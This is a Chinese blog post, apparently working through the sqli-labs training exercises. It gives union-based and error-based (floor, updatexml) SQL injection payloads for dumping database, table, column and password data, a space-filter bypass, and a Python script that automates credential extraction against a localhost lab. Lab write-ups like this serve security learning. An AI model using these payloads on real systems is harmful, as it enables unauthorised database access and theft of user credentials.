<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>基础漏洞总结 | a1batr0ss's blog</title><meta name="author" content="a1batr0ss"><meta name="copyright" content="a1batr0ss"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入No.1【单引号字符型】我们输入?id&#x3D;2-1发现回显第二个数据 我们输入?id&#x3D;1’发现回显错误： 12near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1            &#x2F;&#x2F;最外面两个单引号相当于没有&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1  可推断出后台的sql语句类似于字符型">
<meta property="og:type" content="article">
<meta property="og:title" content="基础漏洞总结">
<meta property="og:url" content="http://example.com/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="a1batr0ss&#39;s blog">
<meta property="og:description" content="sql注入No.1【单引号字符型】我们输入?id&#x3D;2-1发现回显第二个数据 我们输入?id&#x3D;1’发现回显错误： 12near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1            &#x2F;&#x2F;最外面两个单引号相当于没有&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1  可推断出后台的sql语句类似于字符型">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/gd.jpg">
<meta property="article:published_time" content="2023-06-26T03:19:37.000Z">
<meta property="article:modified_time" content="2023-06-26T03:42:41.831Z">
<meta property="article:author" content="a1batr0ss">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/gd.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"S6VV8S72UN","apiKey":"213cab484658fcb4afb624d0feb36b6c","indexName":"a1batr0ss","hits":{"per_page":6},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '基础漏洞总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-06-26 11:42:41'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/gd.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">a1batr0ss's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基础漏洞总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-06-26T03:19:37.000Z" title="Created 2023-06-26 11:19:37">2023-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-06-26T03:42:41.831Z" title="Updated 2023-06-26 11:42:41">2023-06-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">26.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>118min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="基础漏洞总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="No-1【单引号字符型】"><a href="#No-1【单引号字符型】" class="headerlink" title="No.1【单引号字符型】"></a>No.1【单引号字符型】</h2><p>我们输入?id&#x3D;2-1发现回显<strong>第二个</strong>数据</p>
<p>我们输入?id&#x3D;1’发现回显错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1            //最外面两个单引号相当于没有</span><br><span class="line">&#x27;1&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>可推断出后台的sql语句类似于<strong>字符型注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">SELECT * FROM xxx WHERE id=&#x27;$id&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>字符型传入sql的代码类似于 SELECT * FROM xxx WHERE id&#x3D;’2-1’ LIMIT 0,1，2-1会被当成字符来查询，从而取符号之前的2</p>
</blockquote>
<p>于是我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM xxx WHERE id=&#x27;$id&#x27; order by n --+&#x27; LIMIT 0,1</span><br><span class="line">即?id=1&#x27; order by n --+ </span><br></pre></td></tr></table></figure>

<p>通过改变n的个数来确定字段的个数，因为order by n相当于以第n列为标准排序，当n大于字段个数时候，就会报错，类似于：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1_1.png" alt="1_1"></p>
<p>接着利用这张表开始一步步爆破就好了</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1_2.png" alt="1_2"></p>
<p>首先爆出库名：[security]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 --+        //其中union后面的字段数要和之前的字段列数相等</span><br><span class="line">或者</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p>接着爆出表名：【users】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<p>接着爆出列名：【id, username, password】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>

<p>最后爆出内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>

<p>就得到了：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1_3.png" alt="1_3"></p>
<h2 id="No-2【数字型】"><a href="#No-2【数字型】" class="headerlink" title="No.2【数字型】"></a>No.2【数字型】</h2><p>输入?id&#x3D;2-1,得到第一列的结果</p>
<blockquote>
<p>为什么不能用?id&#x3D;1+1测试？</p>
<p>因为+在php里会被当成连接两个字符的连接符</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">&lt;?php</span><br><span class="line"> $id=$_GET[&#x27;id&#x27;];</span><br><span class="line"> $id=&quot;id=$id&quot;;</span><br><span class="line"> echo $id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?id&#x3D;1+1得到</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2_1.png" alt="2_1"></p>
<p>?id&#x3D;2-1得到</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2_2.png" alt="2_2"></p>
</blockquote>
<p>输入?id&#x3D;1’，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">即</span><br><span class="line">&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>输入?id&#x3D;1 –+，回显正常</p>
<p>推断后台代码为<strong>数字型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">SELECT * FROM xxx WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>数字型传入sql的代码类似于 SELECT * FROM xxx WHERE id&#x3D;2-1 LIMIT 0,1，2-1会被当成数字1来查询</p>
</blockquote>
<p>于是接下来类似No.1这样注入就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于字符型和数字型，有如下测试</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2_3.png" alt="2_3"></p>
</blockquote>
<h2 id="No-3【-‘-id’-】"><a href="#No-3【-‘-id’-】" class="headerlink" title="No.3【 (‘$id’) 】"></a>No.3【 (‘$id’) 】</h2><p>输入?id&#x3D;2-1回显第二列</p>
<p>输入?id&#x3D;1’报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="line">即</span><br><span class="line">&#x27;1&#x27;&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>推断为字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">SELECT * FROM xxx WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>于是输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) --+</span><br></pre></td></tr></table></figure>

<p>成功回显第一列</p>
<p>那么接下来就按照前两种方法注入就行了，类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<h2 id="No-4【-“-id”-】"><a href="#No-4【-“-id”-】" class="headerlink" title="No.4【 (“$id”) 】"></a>No.4【 (“$id”) 】</h2><p>这题我先摆上源码吧，比较难顶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>输入?id&#x3D;1”报错，类似于有一个双引号找不到匹配的双引号</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4_2.png" alt="4_2"></p>
<p>输入?id&#x3D;1’不报错，类似于sql把双引号里的看作字符，那么1’就相当于1</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4_1.png" alt="4_1"></p>
<p>输入?id&#x3D;1’)也不报错，类似于之前1’</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4_3.png" alt="4_3"></p>
<h3 id="发现1"><a href="#发现1" class="headerlink" title="发现1"></a>发现1</h3><blockquote>
<p>事实上，在(“1’)”)第一个右括号之后加任何奇怪的字符，都不会报错，因为’)之后的全部省略了</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4_4.png" alt="4_4"></p>
</blockquote>
<p>至于这道题的解法，那和之前类似，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<h2 id="No-5【报错型注入】"><a href="#No-5【报错型注入】" class="headerlink" title="No.5【报错型注入】"></a>No.5【报错型注入】</h2><p>输入?id&#x3D;1发现不回显</p>
<p>输入?id&#x3D;1’报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">即</span><br><span class="line">&#x27;1&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>是单引号字符注入，但是不回显就很难受</p>
<p>基本的注入点就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br></pre></td></tr></table></figure>

<h3 id="floor报错注入原理分析"><a href="#floor报错注入原理分析" class="headerlink" title="floor报错注入原理分析"></a>floor报错注入原理分析</h3><p>首先创建一张测试表</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_1.png" alt="5_1"></p>
<p>然后我们以age为主键进行分类</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_2.png" alt="5_2"></p>
<p>再创造一个能生成伪随机数的语句</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_3.png" alt="5_3"></p>
<p>于是可以构造：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_4.png" alt="5_4"></p>
<p>发现报错爆出了数据表的名字，那么为什么会产生“ Duplicate entry ‘test1’ for key ‘<group_key>‘ ”的错误呢？</group_key></p>
<blockquote>
<p>group by的工作原理</p>
<ol>
<li><p>首先，创造一张空的表</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>扫描原始表，x进行了第一次运算，按照上上个图片知道x的结果是test0</p>
</li>
<li><p>在空表里进行查询，发现无test0字段，于是准备进行插入</p>
</li>
<li><p>插入时需要知道插入什么，于是x进行第二次运算，x&#x3D;test1</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>test1</td>
</tr>
</tbody></table>
</li>
<li><p>继续扫描原始表，进行第三次运算，x&#x3D;test1，而此时test1已经存在于是插入</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>test1</td>
</tr>
</tbody></table>
</li>
<li><p>继续扫描原始表，进行第四次运算，x&#x3D;test0，这个最终表里没有，所以准备插入test0</p>
</li>
<li><p>插入时再次进行运算【第五次】，x&#x3D;test1。可是发现test1已经存在于最终表里了，于是系统不晓得怎么办，即报错了。</p>
</li>
</ol>
</blockquote>
<p>知道了这些原理我们就可以开始sql注入了【还是要注意列数的相匹配，原来有三列，而计数只有count(*)和x两列，所以要加一列】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br><span class="line">或者</span><br><span class="line">?id=-1&#x27; union select 1,2,3 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x)a --+</span><br><span class="line">/*没有这个a会报错“Every derived table must have its own alias”，大概意思就是from后面当成了一个表，而这个表如果不加a相当于没有名字*/</span><br><span class="line">或者</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br></pre></td></tr></table></figure>

<p>但是第三种有个严重的问题就是group_concat只能读64个字符，不一定读的全：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_5.png" alt="5_5"></p>
<p>显然最后一个单词就没读全</p>
<p>我们想到可不可以去掉group_concat()呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select schema_name from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_6.png" alt="5_6"></p>
<p>显然是不行的，那么我们可以使用limit 0,1来一个个输出这些数据，改变n的值一个个试试出库名【security】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select schema_name from information_schema.schemata limit n,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出表名【users】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出列名【id，username，password】，可以在中间加个@，使得结果id@1更清楚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),&#x27;@&#x27;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat((select password from security.users limit 0,1),&#x27;@&#x27;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>而对于这种麻烦的工作我们可以写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost/Sql-labs/Less-5&#x27;</span></span><br><span class="line">column = [<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No.&quot;</span> +<span class="built_in">str</span>(i)+ <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=-1&#x27; union select 1,count(*),concat((select &quot;</span> +column[j]+ <span class="string">&quot; from security.users limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&#x27;@&#x27;,floor(rand(0)*2))x from information_schema.schemata group by x  --+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        con = r.text</span><br><span class="line">        start = con.find(<span class="string">&#x27;Duplicate entry&#x27;</span>)</span><br><span class="line">        end = con.find(<span class="string">&#x27;for key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start==-<span class="number">1</span>:</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(con[start+<span class="number">17</span>:end-<span class="number">4</span>])</span><br></pre></td></tr></table></figure>

<h3 id="updatexml-XML-document-XPath-string-new-value-报错注入"><a href="#updatexml-XML-document-XPath-string-new-value-报错注入" class="headerlink" title="updatexml(XML_document, XPath_string, new_value)报错注入"></a>updatexml(XML_document, XPath_string, new_value)报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select(database())),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_7.png" alt="5_7"></p>
<p>updatexml也是限制了32位的字符输出，我们还是利用limit n,1慢慢爆出表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>假如该题还限制了空格的输入，那么我们还可以这样：(括号代替空格，like代替&#x3D;)【limit 0,1不太知道怎么替换】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;security&#x27;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

